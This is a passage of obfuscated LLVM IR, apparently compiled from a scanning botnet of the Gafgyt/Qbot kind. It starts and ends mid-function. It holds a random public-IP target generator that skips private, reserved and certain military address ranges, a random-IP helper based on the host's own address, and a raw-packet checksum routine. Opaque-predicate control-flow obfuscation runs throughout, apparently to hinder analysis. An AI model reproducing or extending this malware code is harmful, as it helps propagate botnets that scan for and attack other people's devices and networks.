  %21 = icmp eq i32 %20, 0
  br i1 %21, label %312, label %22

; <label>:22:                                     ; preds = %18
  %23 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GetRandomPublicIP.ipState, i64 0, i64 0), align 1
  %24 = zext i8 %23 to i32
  %25 = icmp eq i32 %24, 3
  br i1 %25, label %312, label %26

; <label>:26:                                     ; preds = %22
  %27 = load i32, i32* @x.65
  %28 = load i32, i32* @y.66
  %29 = sub i32 %27, 1
  %30 = mul i32 %27, %29
  %31 = urem i32 %30, 2
  %32 = icmp eq i32 %31, 0
  %33 = icmp slt i32 %28, 10
  %34 = or i1 %32, %33
  br i1 %34, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %26
  %35 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GetRandomPublicIP.ipState, i64 0, i64 0), align 1
  %36 = zext i8 %35 to i32
  %37 = icmp eq i32 %36, 15
  %38 = load i32, i32* @x.65
  %39 = load i32, i32* @y.66
  %40 = sub i32 %38, 1
  %41 = mul i32 %38, %40
  %42 = urem i32 %41, 2
  %43 = icmp eq i32 %42, 0
  %44 = icmp slt i32 %39, 10
  %45 = or i1 %43, %44
  br i1 %45, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %37, label %312, label %46

; <label>:46:                                     ; preds = %originalBBpart2
  %47 = load i32, i32* @x.65
  %48 = load i32, i32* @y.66
  %49 = sub i32 %47, 1
  %50 = mul i32 %47, %49
  %51 = urem i32 %50, 2
  %52 = icmp eq i32 %51, 0
  %53 = icmp slt i32 %48, 10
  %54 = or i1 %52, %53
  br i1 %54, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %46
  %55 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GetRandomPublicIP.ipState, i64 0, i64 0), align 1
  %56 = zext i8 %55 to i32
  %57 = icmp eq i32 %56, 16
  %58 = load i32, i32* @x.65
  %59 = load i32, i32* @y.66
  %60 = sub i32 %58, 1
  %61 = mul i32 %58, %60
  %62 = urem i32 %61, 2
  %63 = icmp eq i32 %62, 0
  %64 = icmp slt i32 %59, 10
  %65 = or i1 %63, %64
  br i1 %65, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br i1 %57, label %312, label %66

; <label>:66:                                     ; preds = %originalBBpart24
  %67 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GetRandomPublicIP.ipState, i64 0, i64 0), align 1
  %68 = zext i8 %67 to i32
  %69 = icmp eq i32 %68, 56
  br i1 %69, label %312, label %70

; <label>:70:                                     ; preds = %66
  %71 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GetRandomPublicIP.ipState, i64 0, i64 0), align 1
  %72 = zext i8 %71 to i32
  %73 = icmp eq i32 %72, 10
  br i1 %73, label %312, label %74

; <label>:74:                                     ; preds = %70
  %75 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GetRandomPublicIP.ipState, i64 0, i64 0), align 1
  %76 = zext i8 %75 to i32
  %77 = icmp eq i32 %76, 192
  br i1 %77, label %78, label %82

; <label>:78:                                     ; preds = %74
  %79 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GetRandomPublicIP.ipState, i64 0, i64 1), align 1
  %80 = zext i8 %79 to i32
  %81 = icmp eq i32 %80, 168
  br i1 %81, label %312, label %82

; <label>:82:                                     ; preds = %78, %74
  %83 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GetRandomPublicIP.ipState, i64 0, i64 0), align 1
  %84 = zext i8 %83 to i32
  %85 = icmp eq i32 %84, 172
  br i1 %85, label %86, label %94

; <label>:86:                                     ; preds = %82
  %87 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GetRandomPublicIP.ipState, i64 0, i64 1), align 1
  %88 = zext i8 %87 to i32
  %89 = icmp sge i32 %88, 16
  br i1 %89, label %90, label %94

; <label>:90:                                     ; preds = %86
  %91 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GetRandomPublicIP.ipState, i64 0, i64 1), align 1
  %92 = zext i8 %91 to i32
  %93 = icmp slt i32 %92, 32
  br i1 %93, label %312, label %94

; <label>:94:                                     ; preds = %90, %86, %82
  %95 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GetRandomPublicIP.ipState, i64 0, i64 0), align 1
  %96 = zext i8 %95 to i32
  %97 = icmp eq i32 %96, 100
  br i1 %97, label %98, label %106

; <label>:98:                                     ; preds = %94
  %99 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GetRandomPublicIP.ipState, i64 0, i64 1), align 1
  %100 = zext i8 %99 to i32
  %101 = icmp sge i32 %100, 64
  br i1 %101, label %102, label %106

; <label>:102:                                    ; preds = %98
  %103 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GetRandomPublicIP.ipState, i64 0, i64 1), align 1
  %104 = zext i8 %103 to i32
  %105 = icmp slt i32 %104, 127
  br i1 %105, label %312, label %106

; <label>:106:                                    ; preds = %102, %98, %94
  %107 = load i32, i32* @x.65
  %108 = load i32, i32* @y.66
  %109 = sub i32 %107, 1
  %110 = mul i32 %107, %109
  %111 = urem i32 %110, 2
  %112 = icmp eq i32 %111, 0
  %113 = icmp slt i32 %108, 10
  %114 = or i1 %112, %113
  br i1 %114, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %106
  %115 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GetRandomPublicIP.ipState, i64 0, i64 0), align 1
  %116 = zext i8 %115 to i32
  %117 = icmp eq i32 %116, 169
  %118 = load i32, i32* @x.65
  %119 = load i32, i32* @y.66
  %120 = sub i32 %118, 1
  %121 = mul i32 %118, %120
  %122 = urem i32 %121, 2
  %123 = icmp eq i32 %122, 0
  %124 = icmp slt i32 %119, 10
  %125 = or i1 %123, %124
  br i1 %125, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br i1 %117, label %126, label %146

; <label>:126:                                    ; preds = %originalBBpart28
  %127 = load i32, i32* @x.65
  %128 = load i32, i32* @y.66
  %129 = sub i32 %127, 1
  %130 = mul i32 %127, %129
  %131 = urem i32 %130, 2
  %132 = icmp eq i32 %131, 0
  %133 = icmp slt i32 %128, 10
  %134 = or i1 %132, %133
  br i1 %134, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %126
  %135 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GetRandomPublicIP.ipState, i64 0, i64 1), align 1
  %136 = zext i8 %135 to i32
  %137 = icmp sgt i32 %136, 254
  %138 = load i32, i32* @x.65
  %139 = load i32, i32* @y.66
  %140 = sub i32 %138, 1
  %141 = mul i32 %138, %140
  %142 = urem i32 %141, 2
  %143 = icmp eq i32 %142, 0
  %144 = icmp slt i32 %139, 10
  %145 = or i1 %143, %144
  br i1 %145, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br i1 %137, label %312, label %146

; <label>:146:                                    ; preds = %originalBBpart212, %originalBBpart28
  %147 = load i32, i32* @x.65
  %148 = load i32, i32* @y.66
  %149 = sub i32 %147, 1
  %150 = mul i32 %147, %149
  %151 = urem i32 %150, 2
  %152 = icmp eq i32 %151, 0
  %153 = icmp slt i32 %148, 10
  %154 = or i1 %152, %153
  br i1 %154, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %146
  %155 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GetRandomPublicIP.ipState, i64 0, i64 0), align 1
  %156 = zext i8 %155 to i32
  %157 = icmp eq i32 %156, 198
  %158 = load i32, i32* @x.65
  %159 = load i32, i32* @y.66
  %160 = sub i32 %158, 1
  %161 = mul i32 %158, %160
  %162 = urem i32 %161, 2
  %163 = icmp eq i32 %162, 0
  %164 = icmp slt i32 %159, 10
  %165 = or i1 %163, %164
  br i1 %165, label %originalBBpart216, label %originalBB14alteredBB

originalBBpart216:                                ; preds = %originalBB14
  br i1 %157, label %166, label %190

; <label>:166:                                    ; preds = %originalBBpart216
  %167 = load i32, i32* @x.65
  %168 = load i32, i32* @y.66
  %169 = sub i32 %167, 1
  %170 = mul i32 %167, %169
  %171 = urem i32 %170, 2
  %172 = icmp eq i32 %171, 0
  %173 = icmp slt i32 %168, 10
  %174 = or i1 %172, %173
  br i1 %174, label %originalBB18, label %originalBB18alteredBB

originalBB18:                                     ; preds = %originalBB18alteredBB, %166
  %175 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GetRandomPublicIP.ipState, i64 0, i64 1), align 1
  %176 = zext i8 %175 to i32
  %177 = icmp sge i32 %176, 18
  %178 = load i32, i32* @x.65
  %179 = load i32, i32* @y.66
  %180 = sub i32 %178, 1
  %181 = mul i32 %178, %180
  %182 = urem i32 %181, 2
  %183 = icmp eq i32 %182, 0
  %184 = icmp slt i32 %179, 10
  %185 = or i1 %183, %184
  br i1 %185, label %originalBBpart220, label %originalBB18alteredBB

originalBBpart220:                                ; preds = %originalBB18
  br i1 %177, label %186, label %190

; <label>:186:                                    ; preds = %originalBBpart220
  %187 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GetRandomPublicIP.ipState, i64 0, i64 1), align 1
  %188 = zext i8 %187 to i32
  %189 = icmp slt i32 %188, 20
  br i1 %189, label %312, label %190

; <label>:190:                                    ; preds = %186, %originalBBpart220, %originalBBpart216
  %191 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GetRandomPublicIP.ipState, i64 0, i64 0), align 1
  %192 = zext i8 %191 to i32
  %193 = icmp eq i32 %192, 224
  br i1 %193, label %312, label %194

; <label>:194:                                    ; preds = %190
  %195 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GetRandomPublicIP.ipState, i64 0, i64 0), align 1
  %196 = zext i8 %195 to i32
  %197 = icmp eq i32 %196, 6
  br i1 %197, label %310, label %198

; <label>:198:                                    ; preds = %194
  %199 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GetRandomPublicIP.ipState, i64 0, i64 0), align 1
  %200 = zext i8 %199 to i32
  %201 = icmp eq i32 %200, 7
  br i1 %201, label %310, label %202

; <label>:202:                                    ; preds = %198
  %203 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GetRandomPublicIP.ipState, i64 0, i64 0), align 1
  %204 = zext i8 %203 to i32
  %205 = icmp eq i32 %204, 11
  br i1 %205, label %310, label %206

; <label>:206:                                    ; preds = %202
  %207 = load i32, i32* @x.65
  %208 = load i32, i32* @y.66
  %209 = sub i32 %207, 1
  %210 = mul i32 %207, %209
  %211 = urem i32 %210, 2
  %212 = icmp eq i32 %211, 0
  %213 = icmp slt i32 %208, 10
  %214 = or i1 %212, %213
  br i1 %214, label %originalBB22, label %originalBB22alteredBB

originalBB22:                                     ; preds = %originalBB22alteredBB, %206
  %215 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GetRandomPublicIP.ipState, i64 0, i64 0), align 1
  %216 = zext i8 %215 to i32
  %217 = icmp eq i32 %216, 21
  %218 = load i32, i32* @x.65
  %219 = load i32, i32* @y.66
  %220 = sub i32 %218, 1
  %221 = mul i32 %218, %220
  %222 = urem i32 %221, 2
  %223 = icmp eq i32 %222, 0
  %224 = icmp slt i32 %219, 10
  %225 = or i1 %223, %224
  br i1 %225, label %originalBBpart224, label %originalBB22alteredBB

originalBBpart224:                                ; preds = %originalBB22
  br i1 %217, label %310, label %226

; <label>:226:                                    ; preds = %originalBBpart224
  %227 = load i32, i32* @x.65
  %228 = load i32, i32* @y.66
  %229 = sub i32 %227, 1
  %230 = mul i32 %227, %229
  %231 = urem i32 %230, 2
  %232 = icmp eq i32 %231, 0
  %233 = icmp slt i32 %228, 10
  %234 = or i1 %232, %233
  br i1 %234, label %originalBB26, label %originalBB26alteredBB

originalBB26:                                     ; preds = %originalBB26alteredBB, %226
  %235 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GetRandomPublicIP.ipState, i64 0, i64 0), align 1
  %236 = zext i8 %235 to i32
  %237 = icmp eq i32 %236, 22
  %238 = load i32, i32* @x.65
  %239 = load i32, i32* @y.66
  %240 = sub i32 %238, 1
  %241 = mul i32 %238, %240
  %242 = urem i32 %241, 2
  %243 = icmp eq i32 %242, 0
  %244 = icmp slt i32 %239, 10
  %245 = or i1 %243, %244
  br i1 %245, label %originalBBpart228, label %originalBB26alteredBB

originalBBpart228:                                ; preds = %originalBB26
  br i1 %237, label %310, label %246

; <label>:246:                                    ; preds = %originalBBpart228
  %247 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GetRandomPublicIP.ipState, i64 0, i64 0), align 1
  %248 = zext i8 %247 to i32
  %249 = icmp eq i32 %248, 26
  br i1 %249, label %310, label %250

; <label>:250:                                    ; preds = %246
  %251 = load i32, i32* @x.65
  %252 = load i32, i32* @y.66
  %253 = sub i32 %251, 1
  %254 = mul i32 %251, %253
  %255 = urem i32 %254, 2
  %256 = icmp eq i32 %255, 0
  %257 = icmp slt i32 %252, 10
  %258 = or i1 %256, %257
  br i1 %258, label %originalBB30, label %originalBB30alteredBB

originalBB30:                                     ; preds = %originalBB30alteredBB, %250
  %259 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GetRandomPublicIP.ipState, i64 0, i64 0), align 1
  %260 = zext i8 %259 to i32
  %261 = icmp eq i32 %260, 28
  %262 = load i32, i32* @x.65
  %263 = load i32, i32* @y.66
  %264 = sub i32 %262, 1
  %265 = mul i32 %262, %264
  %266 = urem i32 %265, 2
  %267 = icmp eq i32 %266, 0
  %268 = icmp slt i32 %263, 10
  %269 = or i1 %267, %268
  br i1 %269, label %originalBBpart232, label %originalBB30alteredBB

originalBBpart232:                                ; preds = %originalBB30
  br i1 %261, label %310, label %270

; <label>:270:                                    ; preds = %originalBBpart232
  %271 = load i32, i32* @x.65
  %272 = load i32, i32* @y.66
  %273 = sub i32 %271, 1
  %274 = mul i32 %271, %273
  %275 = urem i32 %274, 2
  %276 = icmp eq i32 %275, 0
  %277 = icmp slt i32 %272, 10
  %278 = or i1 %276, %277
  br i1 %278, label %originalBB34, label %originalBB34alteredBB

originalBB34:                                     ; preds = %originalBB34alteredBB, %270
  %279 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GetRandomPublicIP.ipState, i64 0, i64 0), align 1
  %280 = zext i8 %279 to i32
  %281 = icmp eq i32 %280, 29
  %282 = load i32, i32* @x.65
  %283 = load i32, i32* @y.66
  %284 = sub i32 %282, 1
  %285 = mul i32 %282, %284
  %286 = urem i32 %285, 2
  %287 = icmp eq i32 %286, 0
  %288 = icmp slt i32 %283, 10
  %289 = or i1 %287, %288
  br i1 %289, label %originalBBpart236, label %originalBB34alteredBB

originalBBpart236:                                ; preds = %originalBB34
  br i1 %281, label %310, label %290

; <label>:290:                                    ; preds = %originalBBpart236
  %291 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GetRandomPublicIP.ipState, i64 0, i64 0), align 1
  %292 = zext i8 %291 to i32
  %293 = icmp eq i32 %292, 30
  br i1 %293, label %310, label %294

; <label>:294:                                    ; preds = %290
  %295 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GetRandomPublicIP.ipState, i64 0, i64 0), align 1
  %296 = zext i8 %295 to i32
  %297 = icmp eq i32 %296, 33
  br i1 %297, label %310, label %298

; <label>:298:                                    ; preds = %294
  %299 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GetRandomPublicIP.ipState, i64 0, i64 0), align 1
  %300 = zext i8 %299 to i32
  %301 = icmp eq i32 %300, 55
  br i1 %301, label %310, label %302

; <label>:302:                                    ; preds = %298
  %303 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GetRandomPublicIP.ipState, i64 0, i64 0), align 1
  %304 = zext i8 %303 to i32
  %305 = icmp eq i32 %304, 214
  br i1 %305, label %310, label %306

; <label>:306:                                    ; preds = %302
  %307 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GetRandomPublicIP.ipState, i64 0, i64 0), align 1
  %308 = zext i8 %307 to i32
  %309 = icmp eq i32 %308, 215
  br label %310

; <label>:310:                                    ; preds = %306, %302, %298, %294, %290, %originalBBpart236, %originalBBpart232, %246, %originalBBpart228, %originalBBpart224, %202, %198, %194
  %311 = phi i1 [ true, %302 ], [ true, %298 ], [ true, %294 ], [ true, %290 ], [ true, %originalBBpart236 ], [ true, %originalBBpart232 ], [ true, %246 ], [ true, %originalBBpart228 ], [ true, %originalBBpart224 ], [ true, %202 ], [ true, %198 ], [ true, %194 ], [ %309, %306 ]
  br label %312

; <label>:312:                                    ; preds = %310, %190, %186, %originalBBpart212, %102, %90, %78, %70, %66, %originalBBpart24, %originalBBpart2, %22, %18, %14
  %313 = phi i1 [ true, %190 ], [ true, %186 ], [ true, %originalBBpart212 ], [ true, %102 ], [ true, %90 ], [ true, %78 ], [ true, %70 ], [ true, %66 ], [ true, %originalBBpart24 ], [ true, %originalBBpart2 ], [ true, %22 ], [ true, %18 ], [ true, %14 ], [ %311, %310 ]
  %314 = load i32, i32* @x.65
  %315 = load i32, i32* @y.66
  %316 = sub i32 %314, 1
  %317 = mul i32 %314, %316
  %318 = urem i32 %317, 2
  %319 = icmp eq i32 %318, 0
  %320 = icmp slt i32 %315, 10
  %321 = or i1 %319, %320
  br i1 %321, label %originalBB38, label %originalBB38alteredBB

originalBB38:                                     ; preds = %originalBB38alteredBB, %312
  %322 = load i32, i32* @x.65
  %323 = load i32, i32* @y.66
  %324 = sub i32 %322, 1
  %325 = mul i32 %322, %324
  %326 = urem i32 %325, 2
  %327 = icmp eq i32 %326, 0
  %328 = icmp slt i32 %323, 10
  %329 = or i1 %327, %328
  br i1 %329, label %originalBBpart240, label %originalBB38alteredBB

originalBBpart240:                                ; preds = %originalBB38
  br i1 %313, label %330, label %343

; <label>:330:                                    ; preds = %originalBBpart240
  %331 = call i32 @rand() #2
  %332 = srem i32 %331, 223
  %333 = trunc i32 %332 to i8
  store i8 %333, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GetRandomPublicIP.ipState, i64 0, i64 0), align 1
  %334 = call i32 @rand() #2
  %335 = srem i32 %334, 255
  %336 = trunc i32 %335 to i8
  store i8 %336, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GetRandomPublicIP.ipState, i64 0, i64 1), align 1
  %337 = call i32 @rand() #2
  %338 = srem i32 %337, 255
  %339 = trunc i32 %338 to i8
  store i8 %339, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GetRandomPublicIP.ipState, i64 0, i64 2), align 1
  %340 = call i32 @rand() #2
  %341 = srem i32 %340, 255
  %342 = trunc i32 %341 to i8
  store i8 %342, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GetRandomPublicIP.ipState, i64 0, i64 3), align 1
  br label %14

; <label>:343:                                    ; preds = %originalBBpart240
  %344 = bitcast [16 x i8]* %1 to i8*
  call void @llvm.memset.p0i8.i64(i8* %344, i8 0, i64 16, i32 16, i1 false)
  %345 = getelementptr inbounds [16 x i8], [16 x i8]* %1, i32 0, i32 0
  %346 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GetRandomPublicIP.ipState, i64 0, i64 0), align 1
  %347 = zext i8 %346 to i32
  %348 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GetRandomPublicIP.ipState, i64 0, i64 1), align 1
  %349 = zext i8 %348 to i32
  %350 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GetRandomPublicIP.ipState, i64 0, i64 2), align 1
  %351 = zext i8 %350 to i32
  %352 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GetRandomPublicIP.ipState, i64 0, i64 3), align 1
  %353 = zext i8 %352 to i32
  %354 = call i32 (i8*, i8*, ...) @szprintf(i8* %345, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.346, i32 0, i32 0), i32 %347, i32 %349, i32 %351, i32 %353)
  %355 = getelementptr inbounds [16 x i8], [16 x i8]* %1, i32 0, i32 0
  %356 = call i32 @inet_addr(i8* %355) #2
  ret i32 %356

originalBBalteredBB:                              ; preds = %originalBB, %26
  %357 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GetRandomPublicIP.ipState, i64 0, i64 0), align 1
  %358 = zext i8 %357 to i32
  %359 = icmp eq i32 %358, 15
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %46
  %360 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GetRandomPublicIP.ipState, i64 0, i64 0), align 1
  %361 = zext i8 %360 to i32
  %362 = icmp eq i32 %361, 16
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %106
  %363 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GetRandomPublicIP.ipState, i64 0, i64 0), align 1
  %364 = zext i8 %363 to i32
  %365 = icmp eq i32 %364, 169
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %126
  %366 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GetRandomPublicIP.ipState, i64 0, i64 1), align 1
  %367 = zext i8 %366 to i32
  %368 = icmp sgt i32 %367, 254
  br label %originalBB10

originalBB14alteredBB:                            ; preds = %originalBB14, %146
  %369 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GetRandomPublicIP.ipState, i64 0, i64 0), align 1
  %370 = zext i8 %369 to i32
  %371 = icmp eq i32 %370, 198
  br label %originalBB14

originalBB18alteredBB:                            ; preds = %originalBB18, %166
  %372 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GetRandomPublicIP.ipState, i64 0, i64 1), align 1
  %373 = zext i8 %372 to i32
  %374 = icmp sge i32 %373, 18
  br label %originalBB18

originalBB22alteredBB:                            ; preds = %originalBB22, %206
  %375 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GetRandomPublicIP.ipState, i64 0, i64 0), align 1
  %376 = zext i8 %375 to i32
  %377 = icmp eq i32 %376, 21
  br label %originalBB22

originalBB26alteredBB:                            ; preds = %originalBB26, %226
  %378 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GetRandomPublicIP.ipState, i64 0, i64 0), align 1
  %379 = zext i8 %378 to i32
  %380 = icmp eq i32 %379, 22
  br label %originalBB26

originalBB30alteredBB:                            ; preds = %originalBB30, %250
  %381 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GetRandomPublicIP.ipState, i64 0, i64 0), align 1
  %382 = zext i8 %381 to i32
  %383 = icmp eq i32 %382, 28
  br label %originalBB30

originalBB34alteredBB:                            ; preds = %originalBB34, %270
  %384 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GetRandomPublicIP.ipState, i64 0, i64 0), align 1
  %385 = zext i8 %384 to i32
  %386 = icmp eq i32 %385, 29
  br label %originalBB34

originalBB38alteredBB:                            ; preds = %originalBB38, %312
  br label %originalBB38
}

; Function Attrs: nounwind
declare i32 @rand() #4

; Function Attrs: noinline nounwind uwtable
define i32 @GetRandomIP(i32) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  store i32 %0, i32* %2, align 4
  %4 = load i32, i32* getelementptr inbounds (%struct.in_addr, %struct.in_addr* @ourIP, i32 0, i32 0), align 4
  %5 = call i32 @ntohl(i32 %4) #13
  %6 = load i32, i32* %2, align 4
  %7 = and i32 %5, %6
  store i32 %7, i32* %3, align 4
  %8 = load i32, i32* %3, align 4
  %9 = call i32 @rand_cmwc()
  %10 = load i32, i32* %2, align 4
  %11 = xor i32 %10, -1
  %12 = and i32 %9, %11
  %13 = xor i32 %8, %12
  ret i32 %13
}

; Function Attrs: nounwind readnone
declare i32 @ntohl(i32) #8

; Function Attrs: noinline nounwind uwtable
define zeroext i16 @csum(i16*, i32) #0 {
  %3 = alloca i16*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i64, align 8
  store i16* %0, i16** %3, align 8
  store i32 %1, i32* %4, align 4
  store i64 0, i64* %5, align 8
  br label %6

; <label>:6:                                      ; preds = %originalBBpart2, %2
  %7 = load i32, i32* %4, align 4
  %8 = icmp sgt i32 %7, 1
  br i1 %8, label %9, label %34

; <label>:9:                                      ; preds = %6
  %10 = load i32, i32* @x.69
  %11 = load i32, i32* @y.70
  %12 = sub i32 %10, 1
  %13 = mul i32 %10, %12
  %14 = urem i32 %13, 2
  %15 = icmp eq i32 %14, 0
  %16 = icmp slt i32 %11, 10
  %17 = or i1 %15, %16
  br i1 %17, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %9
  %18 = load i16*, i16** %3, align 8
  %19 = getelementptr inbounds i16, i16* %18, i32 1
  store i16* %19, i16** %3, align 8
  %20 = load i16, i16* %18, align 2
  %21 = zext i16 %20 to i64
  %22 = load i64, i64* %5, align 8
  %23 = add i64 %22, %21
  store i64 %23, i64* %5, align 8
  %24 = load i32, i32* %4, align 4
  %25 = sub nsw i32 %24, 2
  store i32 %25, i32* %4, align 4
  %26 = load i32, i32* @x.69
  %27 = load i32, i32* @y.70
  %28 = sub i32 %26, 1
  %29 = mul i32 %26, %28
  %30 = urem i32 %29, 2
  %31 = icmp eq i32 %30, 0
  %32 = icmp slt i32 %27, 10
  %33 = or i1 %31, %32
  br i1 %33, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %6

; <label>:34:                                     ; preds = %6
  %35 = load i32, i32* %4, align 4
  %36 = icmp sgt i32 %35, 0
  br i1 %36, label %37, label %60

; <label>:37:                                     ; preds = %34
  %38 = load i32, i32* @x.69
  %39 = load i32, i32* @y.70
  %40 = sub i32 %38, 1
  %41 = mul i32 %38, %40
  %42 = urem i32 %41, 2
  %43 = icmp eq i32 %42, 0
  %44 = icmp slt i32 %39, 10
  %45 = or i1 %43, %44
  br i1 %45, label %originalBB11, label %originalBB11alteredBB

originalBB11:                                     ; preds = %originalBB11alteredBB, %37
  %46 = load i16*, i16** %3, align 8
  %47 = bitcast i16* %46 to i8*
  %48 = load i8, i8* %47, align 1
  %49 = zext i8 %48 to i64
  %50 = load i64, i64* %5, align 8
  %51 = add i64 %50, %49
  store i64 %51, i64* %5, align 8
  %52 = load i32, i32* @x.69
  %53 = load i32, i32* @y.70
  %54 = sub i32 %52, 1
  %55 = mul i32 %52, %54
  %56 = urem i32 %55, 2
  %57 = icmp eq i32 %56, 0
  %58 = icmp slt i32 %53, 10
  %59 = or i1 %57, %58
  br i1 %59, label %originalBBpart226, label %originalBB11alteredBB

originalBBpart226:                                ; preds = %originalBB11
  br label %60

; <label>:60:                                     ; preds = %originalBBpart226, %34
  br label %61

; <label>:61:                                     ; preds = %81, %60
  %62 = load i32, i32* @x.69
  %63 = load i32, i32* @y.70
  %64 = sub i32 %62, 1
  %65 = mul i32 %62, %64
  %66 = urem i32 %65, 2
  %67 = icmp eq i32 %66, 0
  %68 = icmp slt i32 %63, 10
  %69 = or i1 %67, %68
  br i1 %69, label %originalBB28, label %originalBB28alteredBB

originalBB28:                                     ; preds = %originalBB28alteredBB, %61
  %70 = load i64, i64* %5, align 8
  %71 = lshr i64 %70, 16
  %72 = icmp ne i64 %71, 0
  %73 = load i32, i32* @x.69
  %74 = load i32, i32* @y.70
  %75 = sub i32 %73, 1
  %76 = mul i32 %73, %75
  %77 = urem i32 %76, 2
  %78 = icmp eq i32 %77, 0
  %79 = icmp slt i32 %74, 10
  %80 = or i1 %78, %79
  br i1 %80, label %originalBBpart240, label %originalBB28alteredBB

originalBBpart240:                                ; preds = %originalBB28
  br i1 %72, label %81, label %87

; <label>:81:                                     ; preds = %originalBBpart240
  %82 = load i64, i64* %5, align 8
  %83 = and i64 %82, 65535
  %84 = load i64, i64* %5, align 8
  %85 = lshr i64 %84, 16
  %86 = add i64 %83, %85
  store i64 %86, i64* %5, align 8
  br label %61

; <label>:87:                                     ; preds = %originalBBpart240
  %88 = load i32, i32* @x.69
  %89 = load i32, i32* @y.70
  %90 = sub i32 %88, 1
  %91 = mul i32 %88, %90
  %92 = urem i32 %91, 2
  %93 = icmp eq i32 %92, 0
  %94 = icmp slt i32 %89, 10
  %95 = or i1 %93, %94
  br i1 %95, label %originalBB42, label %originalBB42alteredBB

originalBB42:                                     ; preds = %originalBB42alteredBB, %87
  %96 = load i64, i64* %5, align 8
  %97 = xor i64 %96, -1
  %98 = trunc i64 %97 to i16
  %99 = load i32, i32* @x.69
  %100 = load i32, i32* @y.70
  %101 = sub i32 %99, 1
  %102 = mul i32 %99, %101
  %103 = urem i32 %102, 2
  %104 = icmp eq i32 %103, 0
  %105 = icmp slt i32 %100, 10
  %106 = or i1 %104, %105
  br i1 %106, label %originalBBpart252, label %originalBB42alteredBB

originalBBpart252:                                ; preds = %originalBB42
  ret i16 %98

originalBBalteredBB:                              ; preds = %originalBB, %9
  %107 = load i16*, i16** %3, align 8
  %108 = getelementptr inbounds i16, i16* %107, i32 1
  store i16* %108, i16** %3, align 8
  %109 = load i16, i16* %107, align 2
  %110 = zext i16 %109 to i64
  %111 = load i64, i64* %5, align 8
  %_ = shl i64 %111, %110
  %_1 = shl i64 %111, %110
  %_2 = shl i64 %111, %110
  %112 = add i64 %111, %110
  store i64 %112, i64* %5, align 8
  %113 = load i32, i32* %4, align 4
  %_3 = sub i32 %113, 2
